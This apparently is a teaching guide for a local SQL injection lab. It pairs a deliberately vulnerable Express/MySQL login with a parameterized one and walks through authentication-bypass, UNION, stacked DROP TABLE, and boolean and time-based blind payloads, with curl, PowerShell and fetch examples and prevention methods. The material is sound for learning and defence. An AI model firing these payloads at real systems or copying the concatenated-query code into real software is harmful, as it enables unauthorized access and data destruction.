# SQL Injection Lab - Complete Authentication Testing Guide

This guide teaches SQL injection vulnerabilities and prevention techniques through hands-on testing.

---

## 📚 Table of Contents
1. [Quick Start](#quick-start)
2. [Authentication Endpoints](#authentication-endpoints)
3. [Test Payloads](#test-payloads)
4. [How It Works](#how-it-works)
5. [Attack Demonstrations](#attack-demonstrations)
6. [Prevention Methods](#prevention-methods)
7. [Testing Instructions](#testing-instructions)

---

## 🚀 Quick Start

### Test Credentials (Lab Users)
```
Username: admin_demo
Password: DemoPass123
Secret Flag: FLAG{sqli_demo_success_99182}

Username: user_demo
Password: UserPass456
```

### Two Testing Modes
- **Vulnerable Endpoint**: `POST /api/security-lab/sql-injection/login-vulnerable`
- **Secure Endpoint**: `POST /api/security-lab/sql-injection/login-secure`

---

## 🔌 Authentication Endpoints

### Vulnerable Login (String Concatenation)
```
Endpoint: POST http://localhost:5000/api/security-lab/sql-injection/login-vulnerable
Content-Type: application/json

{
  "username": "admin_demo",
  "password": "DemoPass123"
}
```

**How it works internally (VULNERABLE):**
```sql
SELECT * FROM lab_users WHERE username = 'admin_demo' AND password = 'DemoPass123';
```

### Secure Login (Parameterized Queries)
```
Endpoint: POST http://localhost:5000/api/security-lab/sql-injection/login-secure
Content-Type: application/json

{
  "username": "admin_demo",
  "password": "DemoPass123"
}
```

**How it works internally (SAFE):**
```sql
SELECT * FROM lab_users WHERE username = ? AND password = ?
-- Bind values: ["admin_demo", "DemoPass123"]
```

---

## 💉 Test Payloads

### **Payload 1: Classic OR-Based Bypass**
**Purpose:** Bypass authentication by making condition always true

**Vulnerable Endpoint:**
```json
{
  "username": "admin_demo' OR '1'='1",
  "password": "anything"
}
```

**Resulting SQL Query (VULNERABLE):**
```sql
SELECT * FROM lab_users 
WHERE username = 'admin_demo' OR '1'='1' AND password = 'anything'
```

**Result:** ✅ Access Granted (Authentication Bypassed!)
- The `'1'='1'` makes the WHERE clause always true
- Returns the first user in the database

**Secure Endpoint:** ❌ Blocked - treated as literal string
```sql
SELECT * FROM lab_users 
WHERE username = ? AND password = ?
-- Bind value: "admin_demo' OR '1'='1"
-- No match found - Access Denied
```

---

### **Payload 2: Comment-Based Bypass**
**Purpose:** Use SQL comments to ignore password check

**Vulnerable Endpoint:**
```json
{
  "username": "admin_demo' --",
  "password": "anything"
}
```

**Resulting SQL Query (VULNERABLE):**
```sql
SELECT * FROM lab_users 
WHERE username = 'admin_demo' --' AND password = 'anything'
-- Everything after -- is ignored in SQL
```

**Result:** ✅ Access Granted
- The `--` comment removes the password check entirely
- Authentication bypassed with just the username

**How the attack works:**
1. `'` closes the username string
2. `--` comments out the rest of the query
3. Password validation is ignored

---

### **Payload 3: UNION SELECT Data Extraction**
**Purpose:** Extract data from other tables

**Vulnerable Endpoint:**
```json
{
  "username": "admin_demo' UNION SELECT 1,2,3 --",
  "password": "anything"
}
```

**Resulting SQL Query (VULNERABLE):**
```sql
SELECT * FROM lab_users 
WHERE username = 'admin_demo' UNION SELECT 1,2,3 --' AND password = 'anything'
-- Returns: combined results from both SELECT statements
```

**Result:** ⚠️ Error or unexpected data
- Demonstrates how attacker can retrieve data from multiple tables
- Database error might reveal column structure

---

### **Payload 4: Stacked Queries (Advanced)**
**Purpose:** Execute multiple SQL statements

**Vulnerable Endpoint:**
```json
{
  "username": "admin_demo'; DROP TABLE lab_users; --",
  "password": "anything"
}
```

**Resulting SQL Query (VULNERABLE):**
```sql
SELECT * FROM lab_users WHERE username = 'admin_demo'; 
DROP TABLE lab_users; --' AND password = 'anything'
```

**Result:** 💥 Table Deleted!
- Some databases allow stacked queries (MySQL with direct queries)
- Can modify/delete data, not just read

**⚠️ Safety Note:** Lab uses safe query wrapper, so this may not execute. Always use in isolated environments only!

---

### **Payload 5: Boolean-Based Blind SQL Injection**
**Purpose:** Extract data without seeing results directly

**Vulnerable Endpoint:**
```json
{
  "username": "admin_demo' AND SUBSTRING(password,1,1)='D",
  "password": "ignored"
}
```

**Resulting SQL Query (VULNERABLE):**
```sql
SELECT * FROM lab_users 
WHERE username = 'admin_demo' AND SUBSTRING(password,1,1)='D' AND password = 'ignored'
```

**Result:** 
- If first character is 'D': Access Granted
- If not 'D': Access Denied
- Attacker can extract data character by character by observing response differences

---

### **Payload 6: Time-Based Blind SQL Injection**
**Purpose:** Extract data by measuring response time

**Vulnerable Endpoint:**
```json
{
  "username": "admin_demo' AND IF(SUBSTRING(password,1,1)='D', SLEEP(5), 0) --",
  "password": "anything"
}
```

**Resulting SQL Query (VULNERABLE):**
```sql
SELECT * FROM lab_users 
WHERE username = 'admin_demo' AND IF(SUBSTRING(password,1,1)='D', SLEEP(5), 0) --' AND password = 'anything'
```

**Result:**
- If condition is true: Response delays by 5 seconds
- If condition is false: Normal response time
- Attacker can map password character-by-character by timing responses

---

## 🔍 How It Works

### Vulnerable Code Example (String Concatenation)
```typescript
// ❌ VULNERABLE - Never do this!
const username = req.body.username;
const password = req.body.password;

const sql = `SELECT * FROM lab_users WHERE username = '${username}' AND password = '${password}'`;
const results = await dbQuery(sql);  // Direct query execution
```

**Why it's vulnerable:**
1. User input is directly concatenated into SQL string
2. Special characters like `'`, `;`, `--` have special meaning in SQL
3. Attacker can break out of the intended query structure
4. Can modify the logic of the query

---

### Secure Code Example (Parameterized Queries)
```typescript
// ✅ SECURE - Always do this!
const username = req.body.username;
const password = req.body.password;

const sql = 'SELECT * FROM lab_users WHERE username = ? AND password = ?';
const results = await dbQuery(sql, [username, password]);  // Parameterized
```

**Why it's secure:**
1. SQL structure is defined first with placeholders `?`
2. User input is passed separately as parameters
3. Database driver treats parameters as data, not SQL code
4. Special characters are automatically escaped
5. Query structure cannot be modified by user input

---

## 🎯 Attack Demonstrations

### Test 1: Simple Bypass
1. Go to frontend: `http://localhost:3000/security-lab/sql-injection`
2. Select "Vulnerable" mode
3. Enter Username: `admin_demo' OR '1'='1`
4. Enter Password: `anything`
5. Click "Execute"
6. **Expected:** Access Granted with secret flag

### Test 2: Comment Injection
1. Select "Vulnerable" mode
2. Enter Username: `admin_demo' --`
3. Enter Password: (leave empty)
4. **Expected:** Access Granted without needing password

### Test 3: Prevention Test
1. Select "Secure" mode
2. Enter Username: `admin_demo' OR '1'='1`
3. Enter Password: `anything`
4. **Expected:** Access Denied - payload treated as literal string

---

## 🛡️ Prevention Methods

### Method 1: Parameterized Queries (Best Practice)
```typescript
// Using ? placeholders
const users = await dbQuery(
  'SELECT * FROM users WHERE username = ? AND password = ?',
  [username, password]  // Parameters passed separately
);
```

### Method 2: Prepared Statements
```typescript
const stmt = await connection.prepare('SELECT * FROM users WHERE username = ? AND password = ?');
const [rows] = await stmt.execute([username, password]);
```

### Method 3: Input Validation
```typescript
// Whitelist acceptable characters
const validUsername = /^[a-zA-Z0-9_]{3,20}$/.test(username);
if (!validUsername) {
  return res.status(400).json({ error: 'Invalid username format' });
}
```

### Method 4: Stored Procedures
```sql
DELIMITER //
CREATE PROCEDURE AuthenticateUser(IN p_username VARCHAR(50), IN p_password VARCHAR(255))
BEGIN
  SELECT * FROM lab_users WHERE username = p_username AND password = p_password;
END //
DELIMITER ;
```

### Method 5: Escaping (Last Resort)
```typescript
// Only if parameterized queries unavailable
const escaped = mysql.escape(username);
const sql = `SELECT * FROM users WHERE username = ${escaped}`;
```

### Method 6: Detection & Logging
```typescript
// Detect SQL injection patterns and log
const sqlInjectionMatches = detectSqlInjection({ username, password });
if (sqlInjectionMatches.length > 0) {
  logSecurityEvent('sql_injection_attempt', ...);
  return res.status(400).json({ error: 'Suspicious input detected' });
}
```

---

## 📋 Testing Instructions

### Using Browser Frontend
```
1. Navigate to http://localhost:3000/security-lab/sql-injection
2. Choose "Vulnerable" or "Secure" mode
3. Enter test payload in username field
4. Click "Execute" button
5. Observe response and SQL query displayed
```

### Using PowerShell (curl equivalent)
```powershell
# Test Payload 1: OR-based bypass
$body = @{
    username = "admin_demo' OR '1'='1"
    password = "anything"
} | ConvertTo-Json

Invoke-RestMethod -Method Post `
  -Uri "http://localhost:5000/api/security-lab/sql-injection/login-vulnerable" `
  -ContentType "application/json" `
  -Body $body
```

### Using curl
```bash
# Test basic credentials
curl -X POST http://localhost:5000/api/security-lab/sql-injection/login-vulnerable \
  -H "Content-Type: application/json" \
  -d '{"username":"admin_demo","password":"DemoPass123"}'

# Test OR-based bypass
curl -X POST http://localhost:5000/api/security-lab/sql-injection/login-vulnerable \
  -H "Content-Type: application/json" \
  -d '{"username":"admin_demo'"'"' OR '"'"'1'"'"'='"'"'1","password":"anything"}'

# Test comment-based bypass
curl -X POST http://localhost:5000/api/security-lab/sql-injection/login-vulnerable \
  -H "Content-Type: application/json" \
  -d '{"username":"admin_demo'"'"' --","password":"anything"}'
```

### Using JavaScript/Fetch
```javascript
async function testVulnerableLogin(username, password) {
  const response = await fetch('http://localhost:5000/api/security-lab/sql-injection/login-vulnerable', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username, password })
  });
  return await response.json();
}

// Test OR-based bypass
testVulnerableLogin("admin_demo' OR '1'='1", "anything")
  .then(result => console.log(result));
```

---

## 📊 Expected Test Results Table

| Payload | Vulnerable | Secure | Purpose |
|---------|-----------|--------|---------|
| Normal (admin_demo / DemoPass123) | ✅ Success | ✅ Success | Valid credentials |
| `admin_demo' OR '1'='1` / anything | ✅ Success | ❌ Failed | Condition bypass |
| `admin_demo' --` / (any) | ✅ Success | ❌ Failed | Comment injection |
| `' OR 'x'='x` / (any) | ✅ Success | ❌ Failed | Generic bypass |
| `admin' ; DROP TABLE users;--` | ⚠️ May fail* | ❌ Failed | Stacked queries |

*Depends on database configuration

---

## 🔗 Database Schema Reference

```sql
-- Lab Users Table
CREATE TABLE lab_users (
  id INT AUTO_INCREMENT PRIMARY KEY,
  username VARCHAR(50) NOT NULL,
  password VARCHAR(255) NOT NULL,
  secret_note VARCHAR(255) NOT NULL
);

-- Seed Data
INSERT INTO lab_users (username, password, secret_note) VALUES 
('admin_demo', 'DemoPass123', 'FLAG{sqli_demo_success_99182}'),
('user_demo', 'UserPass456', 'Welcome to the secure user area!');
```

---

## 🎓 Learning Objectives

After completing this lab, you should understand:

1. **What is SQL Injection?** - How attackers manipulate SQL queries
2. **Attack Vectors** - Multiple ways SQL injection can occur
3. **Impact** - Authentication bypass, data theft, deletion
4. **Detection** - Pattern matching and suspicious input detection
5. **Prevention** - Best practices and secure coding techniques
6. **Secure vs Vulnerable** - Why parameterized queries work
7. **Real-world Scenario** - How this applies to production systems

---

## ⚠️ Important Security Notes

- **Do NOT use vulnerable code in production**
- This lab is strictly for educational purposes
- Test only on isolated systems you control
- Never attempt SQL injection on systems you don't own
- Always use parameterized queries in real applications
- Keep this knowledge to help secure systems, not harm them

---

## 📚 Additional Resources

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [MySQL Security](https://dev.mysql.com/doc/refman/8.0/en/security.html)

---

## 🔄 Lab Architecture

```
Frontend (Next.js)
    ↓
http://localhost:3000/security-lab/sql-injection
    ↓
Backend (Express)
    ↓
/api/security-lab/sql-injection/login-vulnerable
/api/security-lab/sql-injection/login-secure
    ↓
MySQL Database (lab_users table)
    ↓
Security Logging (audit_logs table)
```

---

Last Updated: 2026-06-15
